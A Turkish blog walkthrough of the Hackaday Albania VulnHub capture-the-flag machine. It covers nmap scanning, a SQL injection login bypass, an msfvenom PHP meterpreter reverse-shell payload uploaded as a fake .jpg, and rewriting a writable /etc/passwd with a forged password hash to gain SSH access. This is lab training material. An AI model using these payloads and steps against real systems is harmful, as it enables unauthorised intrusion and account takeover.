---
layout: post
title: Hack A Day Albania Walktrough
date: '2017-03-03 16:10:00 +0300'
categories: blog
---

Selam,  
Hack A Day Albania CTF sanal makinasının tam çözümünü yaptık, sizlerle paylaşmak istedik. Keyifli okumalar.  
  
    
__Hackaday Albania CTF__

VM hakkında ayrıntılı bilgi alabileceğiniz ve indirme bağlantısını bulabileceğiniz link aşağıdadır  

[VulnHub](https://www.vulnhub.com/entry/hackday-albania,167/)


__VM çözümü__  

İlk önce kendi sistemimizin nasıl bir ağ yapılandırması ile çalıştığını öğrenmek için  

```
ifconfig
```  

komutu ile kendi IP adresimizi ve Subnet Mask'ımızı öğrenip(192.168.1.0/24 ağında bulunuyorum)   

```
nmap 192.168.1.1/24
```  

komutunu kullanarak içinde bulunduğumuz ağda bulunan diğer cihazları bulmak için nmap aracını **192.168.1.1/24** 
ağına yönelik normal tarama yapması için çalıştırıyoruz. Tarama sonucunda, **192.168.1.10** IP adresine sahip hedefimizin üzerinde;
22 TCP portunda SSH, 8008 TCP portunda bir HTTP servisinin açık olduğunu keşfediyoruz.


![]({{ AUCyberClub.github.io }}/assets/img/hackaday/01.png)  


Fakat normal taramada (ki bu top 1000 porttur) açık olmayan, ama servis verir durumda olan bir port olup olmadığını öğrenmek
için hedef sisteme standart tarama yerine birde ayrıca full port taraması yapıyoruz, böylelikle top 1000 port arasında olmayan ama servis verir yani açık durumda olan portları da tespit edebilriz.  
Örnek olarak, kendi sistemimizde bulunan SSH servisini normalde hizmet vermesi gereken 22 numaralı porttan 1996 portuna taşırsak normal tarama ve full port tarama sonucu aşağıdaki gibi olacaktır.


![]({{ AUCyberClub.github.io }}/assets/img/hackaday/02.png)  


```
nmap -n -p 1-65535 -sV 192.168.1.10 --open
```  
    
komutu ile tüm açık TCP portlarını listeliyoruz ancak bunlara ek açık bir port göremiyoruz
bunun üzerine HTTP portuna yönelip browserımızda  
```
http://192.168.1.10:8080
```

adresine gitmeyi deniyoruz. 8008 portunu belirtmek zorundayız çünkü HTTP 
varsayılan portu 80 dir ve browser 80 portunu deneyeceği için hata alacaktır.
Siteye girdiğimizde bizi Elliot Alderson yani nam-ı diğer Mr.Robot
karşılıyor ve bilmediğimiz bir dilde yazılmış birkaç satır. Bu satırları google translateden
çevirince çok anlamlı çıkmasa da arnavutça yazılmış olduğunu anlıyoruz ve yazıda **nereye gideceğini
bildiğini** ifade ediyor. Sayfa kodlarında da birşey bulamayınca, 
hemen adresi **[Owasp ZAP](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project)** aracında tarattığımızda birşey gözümüze çarpıyor:

```
robots.txt
```   
    

![]({{ AUCyberClub.github.io }}/assets/img/hackaday/03.png)  


içerisindeki adresleri denediğimizde de hep aynı sayfa ve kaynak
kodlarında da ekstra birşey bulamıyoruz.  


![]({{ AUCyberClub.github.io }}/assets/img/hackaday/04.png)  


Fakat ortalara doğru

```
/unisxcudkqjydw
```

adresini girdiğimizde farklı bir sayfa ve bir ipucuyla karşılaşıyoruz  


![]({{ AUCyberClub.github.io }}/assets/img/hackaday/05.png)  


tabi hemen ipucunu değerlendirip sonuna ekliyoruz. Yani adresi

```
http://192.168.1.10:8008/unisxcudkqjydw/vulnbank/
```

haline getiriyoruz ve gelen sayfadaki client linkini denediğimizde de bizi çok 
güvenli olduğunu iddia eden bir banka karşılıyor. Tabiki aklımıza hemen SQL Injection
geliyor ve tepki ölçmek adına kullanıcı ve parola kısmına birer tırnak(')
koyuyoruz. Oltaya takılan balık ilk başta bizi çok heyecanlandırıyor.


![]({{ AUCyberClub.github.io }}/assets/img/hackaday/06.png)  


MySQL servisi kullanıldığını ve istismar et beni dercesine bakan bir mesajı
görüyoruz. Hemen büyük bir özgüvenle   

```
' or '1' = '1
```

olarak bilinen genel yöntemi deniyoruz ancak çok da sazan olmadığını
kanıtlarcasına bizi başta ürküten bir hata alıyoruz:


```
Invalid Credentials...
```


tabi ki pes etmeyip bikaç genel geçer yöntem daha deniyoruz ancak o bize, biz de
ona bakıyoruz. Sonra yorum satırı haline getirsek nolur diye düşünüp
username ve password'e:

```
' or 'aucc' = 'aucc';#
```

yazarak (sadece username'e yazıp password'ü gereksiz doldursanızda olur)
SQL sorgusu kodunu doğru döndürüp kalan sorguyu yorum haline getiriyoruz
ve 25000 euroluk hesabıyla bizi charles karşılıyor.


![]({{ AUCyberClub.github.io }}/assets/img/hackaday/07.png)   


fakat gözümüz hala doymamış olacak ki sistem hedefinden şaşmayıp sağda duran **Contact Support**
kısmında file selecti görünce kalbimiz çarpıyor. Tabi durmayıp

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f raw > aucc.php
```  

ile **192.168.1.5** IP adresli Kali Linux makinemizin 4444 portuna yönlendiren
bir php zararlı yazılımı, üretip onu da raw formatında **aucc.php** adında
bir dosyaya yazıyoruz ve metasploitimizi de resimdeki gibi hazırlayıp


![]({{ AUCyberClub.github.io }}/assets/img/hackaday/08.png)  


bizi renklerle kandıracağını düşünenlere de mesajımızı vererek
**aucc.php** yi yüklemeye çalışıyoruz  


![]({{ AUCyberClub.github.io }}/assets/img/hackaday/09.png)  


fakat hacklendikten sonra artık sadece jpg ve türevi kabul ediyoruz diyerek bize kapıyı gösteriyor.


![]({{ AUCyberClub.github.io }}/assets/img/hackaday/10.png)  


Biz de, al sana jpg diyip **aucc.php** nin adını **aucc.jpg** olarak olarak değiştirip
yepyeni bir sticker göndermesiyle yüklüyoruz. 


![]({{ AUCyberClub.github.io }}/assets/img/hackaday/11.png)  


Ve dosyayı yedirmeyi başardık. Fakat msfconsole hala bekliyor yani bizim bu dosyayı açtırmamız lazım.
bıraktığımız Ticket'ın üzerine tıklayıp, sistem **aucc.jpg** dosyasını açmaya çalışınca
msfconsole da bir hareketlilik baş gösteriyor ve meterpreter konsolundayız. Bana göre sahte kısmı burada
başlıyor çünkü normal sistemlerde karşımıza kolay kolay çıkmayacak olan olayla burada karşılaştım.

```
/etc/group
```

dosyasından sudo yetkisine sahip kullanıcılara baktığımda 'taviso'yu görüp ona erişmeyi denesemde çözüm
bu olmadığından başaramadım. Fakat dediğim gibi karşımıza kolay kolay çıkmayacak şekilde

```
/etc/passwd
```

doaysının izinlerine baktığımızda write iznini farkediyoruz. Tabi **meterpreter** üzerinden bunu editlemek biraz
sancılı olacağı için

```
download /etc/passwd
```

ile Kali'ye hedef makinenin passwd dosyasını indiriyoruz. Eski linux sistemler şifreleri(hashlenmiş parolaları) de bu dosyada tutuyordu
fakat daha sonra istismar edilebilirliği daha doğrusu "bruteforce" u engellemek adına şifreleri **/etc/shadow** a
taşıyarak eskiden şifrelerin olduğu yere bir **x** bıraktılar ve bu yolla parola kontrolü için shadow a yönlendirme yaptılar.
shadow un okuma iznide yalnız rootta olduğu için bence "şimdilik yeterince güvenli" bir işe imza attılar. Bu bilgiyi kullanarak

```
openssl passwd -1 -salt tuzlu aucc
```

ile passwd formatında md5(-1) tipinde **tuzlu** ile saltlanmış yani bruteforce u zorlaştırmak adına önlem alınmış ve parola olarak 'aucc'nin 
hashini üretiyoruz ve çıktı olarak :

```
$1$tuzlu$LewyIW83SjgyBrkI29SWh0
```  

alıp bunu herhangi bir editörde "taviso"nun yanındaki 'x' in yerine yapıştırıyoruz(x'i siliyoruz) ve kaydedip çıkıyoruz. 


![]({{ AUCyberClub.github.io }}/assets/img/hackaday/12.png)  


Root'un parolasını da değiştirebilik ancak ben sudo yetkili kullanıcıyı tercih ettim. Düzenlediğimiz bu dosyayı tekrar meterpreter'dan

```
upload passwd /etc/passwd
```

ile hedef sistemdeki passwd nin yerine yüklüyoruz. Artık SSH ile bağlanıp doğru düzgün bir shellde devam edebiliriz.

```
ssh taviso@192.168.1.10
```

ile bağlantımızı kurup parola olarak 

```
aucc
```

yazıyoruz ve içerdeyiz. Son olarak flagi **/root** dizininde bulup

![]({{ AUCyberClub.github.io }}/assets/img/hackaday/13.png)  

```
cat /root/flag.txt
```

ile flag'i bastırıp flag'i gördüğümüze göre sanal makinemizde işimizi bitiriyoruz.

```
FLAG:

    Urime,

    Tani nis raportin!

    (arnavutça "tebrikler, şimdi rapor başlıyor!" yazıyor ve flagi veriyor)
```      
**d5ed38fdbf28bc4e58be142cf5a17cf5**
    
    
      
 ---
 **[Hüseyin Erdem](https://twitter.com/rootofarch)**
